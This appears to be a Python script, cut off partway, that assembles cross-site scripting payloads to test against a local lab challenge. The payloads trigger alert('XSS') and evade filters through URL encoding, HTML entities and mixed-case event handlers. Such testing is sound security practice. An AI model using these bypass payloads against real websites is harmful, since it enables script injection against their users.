import requests
import re
import urllib.parse
import html
import json
from collections import defaultdict

# Target URL
target_url = "http://127.0.0.1:33139/xss25"

# XSS payloads to test
# All payloads aim to execute alert() with capital XSS string
payloads = []

# Payload 1: onfocus with autofocus (lowercase)
payloads.append({
    "name": "onfocus_autofocus_basic",
    "payload": "<input autofocus onfocus=alert(String.fromCharCode(88,83,83))>",
    "encoding": "none"
})

# Payload 2: URL encoded onfocus
payloads.append({
    "name": "onfocus_autofocus_urlenc",
    "payload": "%3Cinput%20autofocus%20onfocus%3Dalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E",
    "encoding": "url"
})

# Payload 3: HTML entity encoded
payloads.append({
    "name": "onfocus_autofocus_htmlent",
    "payload": "&lt;input autofocus onfocus=alert(String.fromCharCode(88,83,83))&gt;",
    "encoding": "html_entities"
})

# Payload 4: Mixed case (OnFoCuS, AuToFoCuS)
payloads.append({
    "name": "onfocus_mixed_case",
    "payload": "<input AuToFoCuS OnFoCuS=alert(String.fromCharCode(88,83,83))>",
    "encoding": "mixed_case"
})

# Payload 5: onclick with img (no quotes)
payloads.append({
    "name": "onclick_img_basic",
    "payload": "<img src=x onclick=alert(String.fromCharCode(88,83,83))>",
    "encoding": "none"
})

# Payload 6: URL encoded onclick
payloads.append({
    "name": "onclick_img_urlenc",
